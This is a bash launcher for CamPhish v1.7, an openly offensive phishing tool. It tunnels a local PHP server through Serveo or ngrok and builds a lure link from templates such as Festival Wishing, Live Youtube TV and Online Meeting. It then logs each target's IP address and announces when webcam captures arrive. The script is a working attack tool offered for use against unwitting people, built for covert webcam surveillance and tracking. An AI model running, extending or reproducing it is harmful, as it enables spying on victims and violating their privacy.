#!/bin/bash
# CamPhish v1.7
# Powered by TechChip
# Credits go to thelinuxchoice [github.com/thelinuxchoice/]

trap 'printf "\n";stop' 2

banner() {
    clear
    printf "\e[1;91m┏┓     ┏┓┓ • ┓   ┏┳┓    ┓\e[0m\n"
    printf "\e[1;91m┃ ┏┓┏┳┓┃┃┣┓┓┏┣┓   ┃ ┏┓┏┓┃\e[0m\n"
    printf "\e[1;91m┗┛┗┻┛┗┗┣┛┛┗┗┛┛┗   ┻ ┗┛┗┛┗\e[0m\n"
    printf "\e[1;91m                               \e[0m\n"
    printf "\n"
}

dependencies() {
    command -v php > /dev/null 2>&1 || { echo >&2 "\e[1;91mI require php but it's not installed. Install it. Aborting.\e[0m"; exit 1; }
    command -v ssh > /dev/null 2>&1 || { echo >&2 "\e[1;91mI require ssh but it's not installed. Install it. Aborting.\e[0m"; exit 1; }
}

stop() {
    pkill -f -2 ngrok > /dev/null 2>&1
    killall -2 php > /dev/null 2>&1
    killall -2 ssh > /dev/null 2>&1
    exit 1
}

catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    printf "\e[1;91m[\e[0m\e[1;91m+\e[0m\e[1;91m] IP:\e[0m\e[1;91m %s\e[0m\n" "$ip"
    cat ip.txt >> saved.ip.txt
}

checkfound() {
    printf "\n\e[1;91m[*] Waiting targets, Press Ctrl + C to exit...\e[0m\n"
    while true; do
        if [[ -e "ip.txt" ]]; then
            printf "\n\e[1;91m[+] Target opened the link!\e[0m\n"
            catch_ip
            rm -rf ip.txt
        fi
        if [[ -e "Log.log" ]]; then
            printf "\n\e[1;91m[+] Cam file received!\e[0m\n"
            rm -rf Log.log
        fi
        sleep 0.5
    done
}

server() {
    printf "\e[1;91m[+] Starting Serveo...\e[0m\n"
    
    if [[ $subdomain_resp == true ]]; then
        ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R "$subdomain":80:localhost:3333 serveo.net 2> /dev/null > sendlink &
    else
        ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink &
    fi

    sleep 8
    printf "\e[1;91m[+] Starting php server... (localhost:3333)\e[0m\n"
    php -S localhost:3333 > /dev/null 2>&1 &
    
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    printf '\e[1;91m[+] Direct link:\e[0m\e[1;91m %s\n' "$send_link"

    checkfound
}

ngrok_server() {
    if [[ ! -e ngrok ]]; then
        printf "\e[1;91m[+] Downloading Ngrok...\e[0m\n"
        wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
        unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
        chmod +x ngrok
        rm -rf ngrok-stable-linux-386.zip
    fi

    printf "\e[1;91m[+] Starting php server...\e[0m\n"
    php -S localhost:3333 > /dev/null 2>&1 &
    sleep 2

    printf "\e[1;91m[+] Starting ngrok server...\e[0m\n"
    ./ngrok http 3333 > /dev/null 2>&1 &
    sleep 10

    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
    printf '\e[1;91m[+] Direct link:\e[0m\e[1;91m %s\n' "$link"

    checkfound
}

select_template() {
    printf "\n\e[1;91m-----Choose a template-----\e[0m\n"    
    printf "\n\e[1;91m[01] Festival Wishing\e[0m\n"
    printf "\e[1;91m[02] Live Youtube TV\e[0m\n"
    printf "\e[1;91m[03] Online Meeting\e[0m\n"
    
    read -p $'\n\e[1;91m[+] Choose a template: [Default is 1] \e[0m' option_tem
    option_tem="${option_tem:-1}"
    
    case $option_tem in
        1) read -p $'\n\e[1;91m[+] Enter festival name: \e[0m' fest_name
           fest_name="${fest_name//[[:space:]]/}"
           ;;
        2) read -p $'\n\e[1;91m[+] Enter YouTube video watch ID: \e[0m' yt_video_ID
           ;;
        3) printf "\n";;
        *) printf "\e[1;91m[!] Invalid template option! Try again.\e[0m\n"
           select_template
           ;;
    esac
}

camphish() {
    if [[ -e sendlink ]]; then
        rm -rf sendlink
    fi

    printf "\n\e[1;91m[01] Serveo.net (BEST!)\e[0m\n"
    printf "\e[1;91m[02] Ngrok\n"
    
    read -p $'\n\e[1;91m[+] Choose a port forwarding option: [Default is 1] \e[0m' option_server
    option_server="${option_server:-1}"

    case $option_server in
        1) server ;;
        2) ngrok_server ;;
        *) printf "\e[1;91m[!] Invalid tunnel option! Try again.\e[0m\n"
           camphish ;;
    esac
}

banner
dependencies
camphish
